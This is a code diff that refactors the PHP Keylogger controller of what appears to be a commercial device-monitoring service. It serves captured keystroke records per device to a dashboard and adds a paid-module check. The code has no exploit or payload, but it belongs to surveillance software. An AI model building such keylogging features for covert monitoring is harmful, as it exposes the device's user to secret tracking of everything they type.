@@ -2,9 +2,12 @@
 
 namespace Controllers;
 
-class Keylogger extends BaseController {
+use Models\Modules,
+    CS\Devices\Limitations;
 
-    protected $module = 'keylogger';
+class Keylogger extends BaseModuleController {
+
+    protected $module = Modules::KEYLOGGER;
     
     protected function init() {
         parent::init();
@@ -14,12 +17,15 @@ class Keylogger extends BaseController {
     
     public function indexAction() {
         $keyloggerModel = new \Models\Cp\Keylogger($this->di);
-        if ($this->isAjaxRequest()) {
-            $dataTableRequest = new \System\DataTableRequest();
+        if ($this->getRequest()->isAjax()) {
+            $dataTableRequest = new \System\DataTableRequest($this->di);
 
-            $dataTableRequest->getRequest($_GET, array('timeFrom', 'timeTo'));
+            $data = $keyloggerModel->getDataTableData(
+                    $this->di['devId'], 
+                    $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
+            );
             $this->checkDisplayLength($dataTableRequest->getDisplayLength());
-            $this->makeJSONResponse($keyloggerModel->getDataTableData($this->di['devId'], $dataTableRequest->getResult()));
+            $this->makeJSONResponse($data);
         }
 
         if ($this->view->paid) {
@@ -34,6 +40,12 @@ class Keylogger extends BaseController {
         $this->buildCpMenu();
         
         $this->view->title = $this->di['t']->_('Keylogger');
+    }
+    
+    protected function isModulePaid()
+    {
+        $devicesLimitations = new Limitations($this->di['db']);
+        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::KEYLOGGER);
     }
 
 }
